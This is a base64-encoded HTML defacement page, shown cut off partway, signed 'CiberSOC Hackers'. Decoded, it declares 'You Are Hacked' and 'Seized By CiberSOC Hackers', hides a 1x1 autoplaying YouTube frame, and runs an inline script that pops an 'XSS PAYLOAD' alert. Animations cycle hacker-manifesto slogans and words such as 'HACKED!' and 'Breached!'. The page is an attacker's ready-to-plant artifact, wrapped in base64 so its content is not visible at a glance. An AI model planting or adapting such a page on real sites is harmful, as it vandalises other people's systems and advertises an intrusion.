"PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIiA+Cgo8aGVhZD4KICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgPHRpdGxlPkhhY2tlZCBCeSBDaWJlclNPQyBIYWNrZXJzPC90aXRsZT4KICA8dGl0bGU+Q2liZXJTT0MgSGFja2VyczwvdGl0bGU+CjxsaW5rIHJlbD0iU0hPUlRDVVQgSUNPTiIgaHJlZj0iaHR0cHM6Ly9pNjgudGlueXBpYy5jb20vNjVzaTl4LmpwZyIgdHlwZT0iaW1hZ2UveC1pY29uIi8+CjxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1Ob3NpZmVyJyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4KPGxpbmsgaHJlZj0naHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PUljZWxhbmQnIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPgo8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9U2FycGFuY2g6NzAwIiByZWw9InN0eWxlc2hlZXQiPgo8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9cGxheSIgcmVsPSJzdHlsZXNoZWV0Ij4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iaHR0cHM6Ly9jc3NoYWtlLnN1cmdlLnNoL2Nzc2hha2UubWluLmNzcyI+CiAgCiAgCiAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL3N0eWxlLmNzcyI+Cgo8c3R5bGU+CiogewogICAgbWFyZ2luOiAwOwogICAgcGFkZGluZzogMDsKfQoKYm9keXsKICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDA7Cn0KCmhlYWRlciB7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOnJnYmEoMzMsIDMzLCAzMywgMC45KTsKICAgIGNvbG9yOiNmZmZmZmY7CiAgICBkaXNwbGF5OmJsb2NrOwogICAgZm9udDogMTRweC8xLjMgQXJpYWwsc2Fucy1zZXJpZjsKICAgIGhlaWdodDo1MHB4OwogICAgcG9zaXRpb246cmVsYXRpdmU7CiAgICB6LWluZGV4OjU7Cn0KaDF7CiAgICBtYXJnaW4tdG9wOiAzMHB4OwogICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgY29sb3I6IHdoaXRlOwogICAgZm9udC1mYW1pbHk6IE5vc2lmZXI7CiAgICB0ZXh0LXNoYWRvdzogMCAwIDAuNWVtIHJlZCwgMCAwIDAuNWVtIHJlZDsKfQoKLndlLWFyZSB7CiAgICBjb2xvcjogcmVkOwogICAgZm9udC1zaXplOiAyMHB4OwogICAgdGV4dC1zaGFkb3c6ICMwMDAgMnB4IDJweCAycHg7CiAgICBsZXR0ZXItc3BhY2luZzogMnB4Owp9CgoubWVzc2FnZSB7CiAgICBjb2xvcjogd2hpdGU7CiAgICAtd2Via2l0LWFuaW1hdGlvbjogZmFkZUluIDFzIGVhc2UtaW47CiAgICBhbmltYXRpb246IGZhZGVJbiAxcyBlYXNlLWluOwp9CgouY24gewogICAgY29sb3I6IHdoaXRlOwogICAgZm9udC1zaXplOiAxNHB4OwogICAgdGV4dC1zaGFkb3c6ICMwMDAgMnB4IDJweCAycHg7CiAgICBsZXR0ZXItc3BhY2luZzogMnB4OwogICAgLXdlYmtpdC1hbmltYXRpb246IGZhZGVJbiAzcyBlYXNlLWluOwogICAgYW5pbWF0aW9uOiBmYWRlSW4gMXMgZWFzZS1pbjsKfQoKLXdlYmtpdC1Aa2V5ZnJhbWVzIHdlLWFyZSB7CiAgICBmcm9tIHtzY2FsZTogMS4xO30KICAgIHRvIHtzY2FsZTogMDt9Cn0KCkBrZXlmcmFtZXMgd2UtYXJlIHsKICAgIGZyb20ge3NjYWxlOiAxLjE7fQogICAgdG8ge3NjYWxlOiAwO30KfQoKLXdlYmtpdC1Aa2V5ZnJhbWVzIGZhZGVJbiB7CiAgIDAlIHtvcGFjaXR5OiAwO30KICAgMTAwJSB7b3BhY2l0eTogMTt9Cn0gCgpAa2V5ZnJhbWVzIGZhZGVJbiB7CiAgIDAlIHtvcGFjaXR5OiAwO30KICAgMTAwJSB7b3BhY2l0eTogMTt9Cn0gCgpAa2V5ZnJhbWVzIG1vdmUtdHdpbmstYmFjayB7CiAgICBmcm9tIHtiYWNrZ3JvdW5kLXBvc2l0aW9uOjAgMDt9CiAgICB0byB7YmFja2dyb3VuZC1wb3NpdGlvbjotMTAwMDBweCA1MDAwcHg7fQp9CkAtd2Via2l0LWtleWZyYW1lcyBtb3ZlLXR3aW5rLWJhY2sgewogICAgZnJvbSB7YmFja2dyb3VuZC1wb3NpdGlvbjowIDA7fQogICAgdG8ge2JhY2tncm91bmQtcG9zaXRpb246LTEwMDAwcHggNTAwMHB4O30KfQpALW1vei1rZXlmcmFtZXMgbW92ZS10d2luay1iYWNrIHsKICAgIGZyb20ge2JhY2tncm91bmQtcG9zaXRpb246MCAwO30KICAgIHRvIHtiYWNrZ3JvdW5kLXBvc2l0aW9uOi0xMDAwMHB4IDUwMDBweDt9Cn0KQC1tcy1rZXlmcmFtZXMgbW92ZS10d2luay1iYWNrIHsKICAgIGZyb20ge2JhY2tncm91bmQtcG9zaXRpb246MCAwO30KICAgIHRvIHtiYWNrZ3JvdW5kLXBvc2l0aW9uOi0xMDAwMHB4IDUwMDBweDt9Cn0KCkBrZXlmcmFtZXMgbW92ZS1jbG91ZHMtYmFjayB7CiAgICBmcm9tIHtiYWNrZ3JvdW5kLXBvc2l0aW9uOjAgMDt9CiAgICB0byB7YmFja2dyb3VuZC1wb3NpdGlvbjoxMDAwMHB4IDA7fQp9CkAtd2Via2l0LWtleWZyYW1lcyBtb3ZlLWNsb3Vkcy1iYWNrIHsKICAgIGZyb20ge2JhY2tncm91bmQtcG9zaXRpb246MCAwO30KICAgIHRvIHtiYWNrZ3JvdW5kLXBvc2l0aW9uOjEwMDAwcHggMDt9Cn0KQC1tb3ota2V5ZnJhbWVzIG1vdmUtY2xvdWRzLWJhY2sgewogICAgZnJvbSB7YmFja2dyb3VuZC1wb3NpdGlvbjowIDA7fQogICAgdG8ge2JhY2tncm91bmQtcG9zaXRpb246MTAwMDBweCAwO30KfQpALW1zLWtleWZyYW1lcyBtb3ZlLWNsb3Vkcy1iYWNrIHsKICAgIGZyb20ge2JhY2tncm91bmQtcG9zaXRpb246IDA7fQogICAgdG8ge2JhY2tncm91bmQtcG9zaXRpb246MTAwMDBweCAwO30KfQoKLnN0YXJzLCAudHdpbmtsaW5nLCAuY2xvdWRzIHsKICBwb3NpdGlvbjphYnNvbHV0ZTsKICB0b3A6MDsKICBsZWZ0OjA7CiAgcmlnaHQ6MDsKICBib3R0b206MDsKICB3aWR0aDoxMDAlOwogIGhlaWdodDoxMDAlOwogIGRpc3BsYXk6YmxvY2s7Cn0KCi5zdGFycyB7CiAgYmFja2dyb3VuZDojMDAwIHVybChodHRwOi8vd3d3LnNjcmlwdC10dXRvcmlhbHMuY29tL2RlbW9zLzM2MC9pbWFnZXMvc3RhcnMucG5nKSByZXBlYXQgdG9wIGNlbnRlcjsKICB6LWluZGV4OjA7Cn0KCi50d2lua2xpbmd7CiAgYmFja2dyb3VuZDp0cmFuc3BhcmVudCB1cmwoaHR0cDovL3d3dy5zY3JpcHQtdHV0b3JpYWxzLmNvbS9kZW1vcy8zNjAvaW1hZ2VzL3R3aW5rbGluZy5wbmcpIHJlcGVhdCB0b3AgY2VudGVyOwogIHotaW5kZXg6MTsKCiAgLW1vei1hbmltYXRpb246bW92ZS10d2luay1iYWNrIDIwMHMgbGluZWFyIGluZmluaXRlOwogIC1tcy1hbmltYXRpb246bW92ZS10d2luay1iYWNrIDIwMHMgbGluZWFyIGluZmluaXRlOwogIC1vLWFuaW1hdGlvbjptb3ZlLXR3aW5rLWJhY2sgMjAwcyBsaW5lYXIgaW5maW5pdGU7CiAgLXdlYmtpdC1hbmltYXRpb246bW92ZS10d2luay1iYWNrIDIwMHMgbGluZWFyIGluZmluaXRlOwogIGFuaW1hdGlvbjptb3ZlLXR3aW5rLWJhY2sgMjAwcyBsaW5lYXIgaW5maW5pdGU7Cn0KCi5jbG91ZHN7CiAgICBiYWNrZ3JvdW5kOnRyYW5zcGFyZW50IHVybChodHRwOi8vd3d3LnNjcmlwdC10dXRvcmlhbHMuY29tL2RlbW9zLzM2MC9pbWFnZXMvY2xvdWRzMy5wbmcpIHJlcGVhdCB0b3AgY2VudGVyOwogICAgYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsKICAgIHotaW5kZXg6MzsKCiAgLW1vei1hbmltYXRpb246bW92ZS1jbG91ZHMtYmFjayAyMDBzIGxpbmVhciBpbmZpbml0ZTsKICAtbXMtYW5pbWF0aW9uOm1vdmUtY2xvdWRzLWJhY2sgMjAwcyBsaW5lYXIgaW5maW5pdGU7CiAgLW8tYW5pbWF0aW9uOm1vdmUtY2xvdWRzLWJhY2sgMjAwcyBsaW5lYXIgaW5maW5pdGU7CiAgLXdlYmtpdC1hbmltYXRpb246bW92ZS1jbG91ZHMtYmFjayAyMDBzIGxpbmVhciBpbmZpbml0ZTsKICBhbmltYXRpb246bW92ZS1jbG91ZHMtYmFjayAyMDBzIGxpbmVhciBpbmZpbml0ZTsKfQoKLmNvbnRhaW5lciB7CiAgaGVpZ2h0OiAxMDAlOwogIHdpZHRoOiAxMDAlOwogIGp1c3RpZnktY29udGVudDogY2VudGVyOwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgZGlzcGxheTogZmxleDsKfQoudGV4dCB7CiAgZm9udC13ZWlnaHQ6IDEwMDsKICBmb250LXNpemU6IDI4cHg7CiAgY29sb3I6ICNGQUZBRkE7CiAgZm9udC1mYW1pbHk6IEljZWxhbmQ7CiAgdGV4dC1zaGFkb3c6IDAgMCAwLjVlbSBjeWFuLCAwIDAgMC41ZW0gY3lhbjsKICAKfQouZHVkIHsKICBjb2xvcjogIzc1NzU3NTsKfQoKLmFuaW1hdGlvbi1jb250YWluZXIgewogIHBvc2l0aW9uOiBmaXhlZDsKICB0b3A6IDA7CiAgbGVmdDogMDsKICByaWdodDogMDsKICBib3R0b206IDA7CiAgei1pbmRleDogMTsKfQoKLmFuaW1hdGlvbi1jb250YWluZXIgc3BhbiB7CiAgY29sb3I6IHdoaXRlc21va2U7CiAgZGlzcGxheTogYmxvY2s7CiAgZm9udC1zaXplOiAxOHB4OwogIGZvbnQtZmFtaWx5OiAnSGVsdmV0aWNhJzsKICB0ZXh0LXNoYWRvdzogMCAwIDFweCB3aGl0ZTsKICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgdXNlci1zZWxlY3Q6IG5vbmU7CiAgcG9pbnRlci1ldmVudHM6IG5vbmU7CiAgY3Vyc29yOiBkZWZhdWx0OwogIHotaW5kZXg6IDE7CiAgb3BhY2l0eTogMDsKICB3aWxsLWNoYW5nZTogdHJhbnNmb3JtLCBvcGFjaXR5OwogIGFuaW1hdGlvbi10aW1pbmctZnVuY3Rpb246IGVhc2Utb3V0OwogIGFuaW1hdGlvbi1uYW1lOiBtb3ZlOwp9CgpAa2V5ZnJhbWVzIG1vdmUgewogIDAlIHsKICAgIG9wYWNpdHk6IDA7CiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMTAwdmgpOwogIH0KICAyNSUgewogICAgb3BhY2l0eTogMTsKICB9CiAgNTAlIHsKICAgIG9wYWNpdHk6IDE7CiAgfQogIDc1JSB7CiAgICBvcGFjaXR5OiAwOwogIH0KICAxMDAlIHsKICAgIG9wYWNpdHk6IDA7CiAgICB0cmFuc2Zvcm06IG5vbmU7CiAgfQp9Ci5idXp6X3dyYXBwZXJ7CiAgcG9zaXRpb246cmVsYXRpdmU7CiAgd2lkdGg6MTAwJTsKICBtYXJnaW46MTgwcHggYXV0bzsKICBiYWNrZ3JvdW5kLWF0dGFjaG1lbnQ6IGZpeGVkOwogICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybChodHRwOi8vaS5pbWd1ci5jb20vOVFwSlBsRy5qcGcpOwogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogMCAwOyAKICAgICAgICBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0IDsgIAogICAgICAgIGJhY2tncm91bmQtc2l6ZTpjb3ZlcjsKICAgICAgICBvdmVyZmxvdyA6IGhpZGRlbjsKICBvdmVyZmxvdzpoaWRkZW47CiAgcGFkZGluZzoxMDBweDsKfQouc2NhbmxpbmV7CiAgd2lkdGg6MTAwJTsKICBkaXNwbGF5OmJsb2NrOwogIGJhY2tncm91bmQ6IzAwMDsKICBoZWlnaHQ6NHB4OwogIHBvc2l0aW9uOnJlbGF0aXZlOwogIHotaW5kZXg6MzsKICBtYXJnaW4tYm90dG9tOjVweDsKICBvcGFjaXR5OjAuMTsKfQouYnV6el93cmFwcGVyIHNwYW57CiAgcG9zaXRpb246YWJzb2x1dGU7CiAgLXdlYmtpdC1maWx0ZXI6IGJsdXIoMXB4KTsKICBmb250LXNpemU6MzBweDsKICBmb250LWZhbWlseTonQ291cmllciBuZXcnLCBmaXhlZDsKICBmb250LXdlaWdodDpib2xkOwp9Ci5idXp6X3dyYXBwZXIgc3BhbjpudGgtY2hpbGQoMSl7CiAgY29sb3I6cmVkOwogIG1hcmdpbi1sZWZ0Oi0ycHg7CiAgLXdlYmtpdC1maWx0ZXI6IGJsdXIoMnB4KTsKfQouYnV6el93cmFwcGVyIHNwYW46bnRoLWNoaWxkKDIpewogIGNvbG9yOmdyZWVuOwogIG1hcmdpbi1sZWZ0OjJweDsKICAtd2Via2l0LWZpbHRlcjogYmx1cigycHgpOwp9Ci5idXp6X3dyYXBwZXIgc3BhbjpudGgtY2hpbGQoMyl7CiAgY29sb3I6Ymx1ZTsKICBwb3NpdGlvbjoyMHB4IDA7CiAgLXdlYmtpdC1maWx0ZXI6IGJsdXIoMXB4KTsKfQouYnV6el93cmFwcGVyIHNwYW46bnRoLWNoaWxkKDQpewogIGNvbG9yOiNmZmY7CiAgLXdlYmtpdC1maWx0ZXI6IGJsdXIoMXB4KTsKICB0ZXh0LXNoYWRvdzowIDAgNTBweCByZ2JhKDI1NSwyNTUsMjU1LDAuNCk7Cn0KLmJ1enpfd3JhcHBlciBzcGFuOm50aC1jaGlsZCg1KXsKICBjb2xvcjpyZ2JhKDI1NSwyNTUsMjU1LDAuNCk7CiAgLXdlYmtpdC1maWx0ZXI6IGJsdXIoMTVweCk7Cn0KCi5idXp6X3dyYXBwZXIgc3BhbnsKICAtd2Via2l0LWFuaW1hdGlvbjogYmx1ciAzMG1zIGluZmluaXRlLCBqZXJrIDUwbXMgaW5maW5pdGU7Cn0KCkAtd2Via2l0LWtleWZyYW1lcyBibHVyIHsKICAwJSAgIHsgLXdlYmtpdC1maWx0ZXI6IGJsdXIoMXB4KTsgb3BhY2l0eTowLjg7fQogIDUwJSB7IC13ZWJraXQtZmlsdGVyOiBibHVyKDFweCk7IG9wYWNpdHk6MTsgfQogIDEwMCV7IC13ZWJraXQtZmlsdGVyOiBibHVyKDFweCk7IG9wYWNpdHk6MC44OyB9Cn0KQC13ZWJraXQta2V5ZnJhbWVzIGplcmsgewogIDUwJSB7IGxlZnQ6MXB4OyB9CiAgNTElIHsgbGVmdDowOyB9Cn0KQC13ZWJraXQta2V5ZnJhbWVzIGplcmt1cCB7CiAgNTAlIHsgdG9wOjFweDsgfQogIDUxJSB7IHRvcDowOyB9Cn0KCi5idXp6X3dyYXBwZXIgc3BhbjpudGgtY2hpbGQoMyl7CiAgLXdlYmtpdC1hbmltYXRpb246IGplcmtibHVlIDFzIGluZmluaXRlOwp9CkAtd2Via2l0LWtleWZyYW1lcyBqZXJrYmx1ZSB7CiAgMCUgeyBsZWZ0OjA7IH0KICAzMCUgeyBsZWZ0OjA7IH0KICAzMSUgeyBsZWZ0OjEwcHg7IH0KICAzMiUgeyBsZWZ0OjA7IH0KICA5OCUgeyBsZWZ0OjA7IH0KICAxMDAlIHsgbGVmdDoxMHB4OyB9Cn0KLmJ1enpfd3JhcHBlciBzcGFuOm50aC1jaGlsZCgyKXsKICAtd2Via2l0LWFuaW1hdGlvbjogamVya2dyZWVuIDFzIGluZmluaXRlOwp9CkAtd2Via2l0LWtleWZyYW1lcyBqZXJrZ3JlZW4gewogIDAlIHsgbGVmdDowOyB9CiAgMzAlIHsgbGVmdDowOyB9CiAgMzElIHsgbGVmdDotMTBweDsgfQogIDMyJSB7IGxlZnQ6MDsgfQogIDk4JSB7IGxlZnQ6MDsgfQogIDEwMCUgeyBsZWZ0Oi0xMHB4OyB9Cn0KCi5idXp6X3dyYXBwZXIgLnRleHR7CiAgLXdlYmtpdC1hbmltYXRpb246IGplcmt3aG9sZSA1cyBpbmZpbml0ZTsKICBwb3NpdGlvbjpyZWxhdGl2ZTsKfQpALXdlYmtpdC1rZXlmcmFtZXMgamVya3dob2xlIHsKICAzMCUgeyAgfQogIDQwJSB7IG9wYWNpdHk6MTsgdG9wOjA7IGxlZnQ6MDsgIC13ZWJraXQtdHJhbnNmb3JtOnNjYWxlKDEsMSk7ICAtd2Via2l0LXRyYW5zZm9ybTpza2V3KDAsMCk7fQogIDQxJSB7IG9wYWNpdHk6MC44OyB0b3A6MHB4OyBsZWZ0Oi0xMDBweDsgLXdlYmtpdC10cmFuc2Zvcm06c2NhbGUoMSwxLjIpOyAgLXdlYmtpdC10cmFuc2Zvcm06c2tldyg1MGRlZywwKTt9CiAgNDIlIHsgb3BhY2l0eTowLjg7IHRvcDowcHg7IGxlZnQ6MTAwcHg7IC13ZWJraXQtdHJhbnNmb3JtOnNjYWxlKDEsMS4yKTsgIC13ZWJraXQtdHJhbnNmb3JtOnNrZXcoLTgwZGVnLDApO30KICA0MyUgeyBvcGFjaXR5OjE7IHRvcDowOyBsZWZ0OjA7IC13ZWJraXQtdHJhbnNmb3JtOnNjYWxlKDEsMSk7ICAtd2Via2l0LXRyYW5zZm9ybTpza2V3KDAsMCk7fQogIDY1JSB7IH0KfQoKPC9zdHlsZT4KCgogIAo8L2hlYWQ+Cgo8Ym9keT4KCiAgPGRpdiBzdHlsZT0icG9zaXRpb246IGZpeGVkOyB0b3A6IDc1cHg7IGxlZnQ6IC0yMjVweDsgd2lkdGg6IDYwMHB4OyBwYWRkaW5nOiAxMHB4OyBmb250LXNpemU6IDI0cHg7IHRleHQtYWxpZ246IGNlbnRlcjsgY29sb3I6IHdoaXRlOyBmb250LWZhbWlseTogJ3RyZWJ1Y2hldCBtcycsIHZlcmRhbmEsIGFyaWFsLCBzYW5zLXNlcmlmO3RyYW5zZm9ybTogcm90YXRlKC00NWRlZyk7dHJhbnNmb3JtLW9yaWdpbjogNTAlIDBweDstby10cmFuc2Zvcm06IHJvdGF0ZSgtNDVkZWcpOyAtby10cmFuc2Zvcm0tb3JpZ2luOiA1MCUgMHB4Oy1tb3otdHJhbnNmb3JtOiByb3RhdGUoLTQ1ZGVnKTsgLW1vei10cmFuc2Zvcm0tb3JpZ2luOiA1MCUgMHB4OyAtd2Via2l0LXRyYW5zZm9ybTogcm90YXRlKC00NWRlZyk7IC13ZWJraXQtdHJhbnNmb3JtLW9yaWdpbjogNTAlIDBweDsgYmFja2dyb3VuZC1jb2xvcjogVHJhbnNwYXJlbnQ7IGJvcmRlcjogMXB4IHNvbGlkIHJnYigxNzAsIDE3MCwgMTcwKTsgei1pbmRleDogOTk5OTsgb3BhY2l0eTogMC41OyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0NpYmVyU09DaGFja2Vycy5pbiIgc3R5bGU9InRleHQtZGVjb3JhdGlvbjpub25lO2NvbG9yOndoaXRlOyI+Q2liZXJTT0MgSGFja2VyczwvYT48L2Rpdj4KPGRpdiBjbGFzcz0ic3RhcnMiPgogIDxjZW50ZXI+CiAgICA8aDE+U2VpemVkIEJ5IENpYmVyU09DIEhhY2tlcnM8L2gxPgogIDwvY2VudGVyPgo8L2Rpdj4KPGRpdiBjbGFzcz0idHdpbmtsaW5nIj4KICA8Y2VudGVyPjxicj48YnI+PGJyPgogICAgPGltZyBzcmM9Imh0dHBzOi8vb25seXB1bHQuY29tL2Jsb2dfdXBsb2Fkcy8xNTEwODI1NjY0LTNmNDZlN2QzZDJiYzJkYjhiYzgzOGUzMmY3YTYyMTFkLnBuZyIgd2lkdGg9IjI1MCIvPjxicj4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgIDxkaXYgY2xhc3M9InRleHQiPjwvZGl2PgogICAgPC9kaXY+PGJyPjxicj48YnI+CiAgICA8Zm9udCBmYWNlPSJTYXJwYW5jaCIgY29sb3I9IndoaXRlIiBzaXplIjEwIiBjbGFzcz0ibWVzc2FnZSI+CiAgICAgIHwmbmJzcDsgIERlbW88Zm9udCBjb2xvcj0icmVkIj5vZiA8L2ZvbnQ+cGFnZSZuYnNwOyAgfAogICAgPC9mb250Pjxicj4KICAgIDxmb250IGZhY2U9IlNhcnBhbmNoIiBjb2xvcj0id2hpdGUiIHNpemUiMTAiIGNsYXNzPSJtZXNzYWdlIj4jSGFja2VkICZidWxsOyBZb3UgQXJlIEhhY2tlZCBCeSBDaWJlclNPQyBIYWNrZXJzIDxmb250IGNvbG9yPSJyZWQiPkFuIFRJQyBERUYgVGVhbS48L2ZvbnQ+PGJyPjxicj4KICAgIDxmb250IGZhY2U9IlBsYXkiPgogICAgICA8cCBjbGFzcz0id2UtYXJlIj48Yj5XRSA8Zm9udCBjb2xvcj0iY3lhbiI+QVJFPGZvbnQgY29sb3I9IndoaXRlIj46PC9iPjwvcD4KICAgIDwvZm9udD4KICAgIDxmb250IGZhY2U9IlBsYXkiIGNsYXNzPSJjbiI+CiAgICAgIC09IENJQkVSU09DXzNUSU4gPGZvbnQgY29sb3I9ImN5YW4iPnw8L2ZvbnQ+IENJQkVSU09DXzZUSU4gPGZvbnQgY29sb3I9ImN5YW4iPnw8L2ZvbnQ+IENJQkVSU09DXzdUSU4gPGZvbnQgY29sb3I9ImN5YW4iPnw8L2ZvbnQ+IENJQkVSU09DXzVUSU4gPS0KICAgIDwvZm9udD4KICA8L2NlbnRlcj4KPC9kaXY+CjxkaXYgY2xhc3M9ImNsb3VkcyI+CjwvZGl2Pgo8aWZyYW1lIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHNyYz0iaHR0cHM6Ly93d3cueW91dHViZS5jb20vZW1iZWQvTEFwUzlHMjJjSVU/cmVsPTAmYXV0b3BsYXk9MSIgZnJhbWVib3JkZXI9IjAiIGFsbG93ZnVsbHNjcmVlbj48L2lmcmFtZT4KICAKICAKCiAgICA8c2NyaXB0ICBzcmM9ImpzL2luZGV4LmpzIj48L3NjcmlwdD4KCiA8c2NyaXB0PgoKYWxlcnQoJ1hTUyBQQVlMT0FEJyk7CgogY2xhc3MgVGV4dFNjcmFtYmxlIHsKICBjb25zdHJ1Y3RvcihlbCkgewogICAgdGhpcy5lbCA9IGVsCiAgICB0aGlzLmNoYXJzID0gJyFAIyQlXiYqKClfLT0re306Inw8Pj8sLi87JwogICAgdGhpcy51cGRhdGUgPSB0aGlzLnVwZGF0ZS5iaW5kKHRoaXMpCiAgfQogIHNldFRleHQobmV3VGV4dCkgewogICAgY29uc3Qgb2xkVGV4dCA9IHRoaXMuZWwuaW5uZXJUZXh0CiAgICBjb25zdCBsZW5ndGggPSBNYXRoLm1heChvbGRUZXh0Lmxlbmd0aCwgbmV3VGV4dC5sZW5ndGgpCiAgICBjb25zdCBwcm9taXNlID0gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHRoaXMucmVzb2x2ZSA9IHJlc29sdmUpCiAgICB0aGlzLnF1ZXVlID0gW10KICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHsKICAgICAgY29uc3QgZnJvbSA9IG9sZFRleHRbaV0gfHwgJycKICAgICAgY29uc3QgdG8gPSBuZXdUZXh0W2ldIHx8ICcnCiAgICAgIGNvbnN0IHN0YXJ0ID0gTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogNDApCiAgICAgIGNvbnN0IGVuZCA9IHN0YXJ0ICsgTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogNDApCiAgICAgIHRoaXMucXVldWUucHVzaCh7IGZyb20sIHRvLCBzdGFydCwgZW5kIH0pCiAgICB9CiAgICBjYW5jZWxBbmltYXRpb25GcmFtZSh0aGlzLmZyYW1lUmVxdWVzdCkKICAgIHRoaXMuZnJhbWUgPSAwCiAgICB0aGlzLnVwZGF0ZSgpCiAgICByZXR1cm4gcHJvbWlzZQogIH0KICB1cGRhdGUoKSB7CiAgICBsZXQgb3V0cHV0ID0gJycKICAgIGxldCBjb21wbGV0ZSA9IDAKICAgIGZvciAobGV0IGkgPSAwLCBuID0gdGhpcy5xdWV1ZS5sZW5ndGg7IGkgPCBuOyBpKyspIHsKICAgICAgbGV0IHsgZnJvbSwgdG8sIHN0YXJ0LCBlbmQsIGNoYXIgfSA9IHRoaXMucXVldWVbaV0KICAgICAgaWYgKHRoaXMuZnJhbWUgPj0gZW5kKSB7CiAgICAgICAgY29tcGxldGUrKwogICAgICAgIG91dHB1dCArPSB0bwogICAgICB9IGVsc2UgaWYgKHRoaXMuZnJhbWUgPj0gc3RhcnQpIHsKICAgICAgICBpZiAoIWNoYXIgfHwgTWF0aC5yYW5kb20oKSA8IDAuMjgpIHsKICAgICAgICAgIGNoYXIgPSB0aGlzLnJhbmRvbUNoYXIoKQogICAgICAgICAgdGhpcy5xdWV1ZVtpXS5jaGFyID0gY2hhcgogICAgICAgIH0KICAgICAgICBvdXRwdXQgKz0gJzxzcGFuIGNsYXNzPSJkdWQiPlwke2NoYXJ9PC9zcGFuPicKICAgICAgfSBlbHNlIHsKICAgICAgICBvdXRwdXQgKz0gZnJvbQogICAgICB9CiAgICB9CiAgICB0aGlzLmVsLmlubmVySFRNTCA9IG91dHB1dAogICAgaWYgKGNvbXBsZXRlID09PSB0aGlzLnF1ZXVlLmxlbmd0aCkgewogICAgICB0aGlzLnJlc29sdmUoKQogICAgfSBlbHNlIHsKICAgICAgdGhpcy5mcmFtZVJlcXVlc3QgPSByZXF1ZXN0QW5pbWF0aW9uRnJhbWUodGhpcy51cGRhdGUpCiAgICAgIHRoaXMuZnJhbWUrKwogICAgfQogIH0KICByYW5kb21DaGFyKCkgewogICAgcmV0dXJuIHRoaXMuY2hhcnNbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogdGhpcy5jaGFycy5sZW5ndGgpXQogIH0KfQoKY29uc3QgcGhyYXNlcyA9IFsKICAnWWVzLCBXZSBhcmUgY3JpbWluYWwuJywKICAnT3VyIGNyaW1lIGlzIG91ciBjdXJpb3NpdHkuJywKICAnT3VyIGNyaW1lIGlzIHRoYXQgb2YganVkZ2luZyBwZW9wbGUgYnkgd2hhdCB0aGV5IHNheSBhbmQgdGhpbmssIG5vdCB3aGF0IHRoZXkgbG9vayBsaWtlLicsCiAgJ091ciBjcmltZSBpcyB0aGF0IG9mIG91dHNtYXJ0aW5nIHlvdSwgc29tZXRoaW5nIHRoYXQgeW91IHdpbGwgbmV2ZXIgZm9yZ2l2ZSB1cyBmb3IuJywKICAnV2UgYXJlIGhhY2tlcnMsIGFuZCB0aGlzIGlzIG91ciBtYW5pZmVzdG8uJywKICAnWW91IG1heSBzdG9wIHRoaXMgaW5kaXZpZHVhbCwgYnV0IHlvdSBjYW50IHN0b3AgdXMgYWxsLi4uJywKICAnYWZ0ZXIgYWxsLCB3ZXJlIGFsbCBhbGlrZS4nCl0KCmNvbnN0IGVsID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnRleHQnKQpjb25zdCBmeCA9IG5ldyBUZXh0U2NyYW1ibGUoZWwpCgpsZXQgY291bnRlciA9IDAKY29uc3QgbmV4dCA9ICgpID0+IHsKICBmeC5zZXRUZXh0KHBocmFzZXNbY291bnRlcl0pLnRoZW4oKCkgPT4gewogICAgc2V0VGltZW91dChuZXh0LCAxNTAwKQogIH0pCiAgY291bnRlciA9IChjb3VudGVyICsgMSkgJSBwaHJhc2VzLmxlbmd0aAp9CgpuZXh0KCkKCid1c2Ugc3RyaWN0JzsKCnZhciBhcHAgPSB7CgogIGNoYXJzOiBbJ0xhenkgSGFja2VycycsJ1NlaXplZCcsJzEyNy4wLjAuMScsJzEzMzcnLCcweDUyMzM0NCcsJ0xvY2FsaG9zdCcsJ1NoNGQwdyBQcjB4JywnSEFDS0VEIScsJ1NlY3VyaXR5JywnQnJlYWNoZWQhJywnU3lzdGVtJ10sCgogIGluaXQ6IGZ1bmN0aW9uICgpIHsKICAgIGFwcC5jb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgIGFwcC5jb250YWluZXIuY2xhc3NOYW1lID0gJ2FuaW1hdGlvbi1jb250YWluZXInOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhcHAuY29udGFpbmVyKTsKICAgIHdpbmRvdy5zZXRJbnRlcnZhbChhcHAuYWRkLCAxMDApOwogIH0sCgogIGFkZDogZnVuY3Rpb24gKCkgewogICAgdmFyIGVsZW1lbnQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzcGFuJyk7CiAgICBhcHAuY29udGFpbmVyLmFwcGV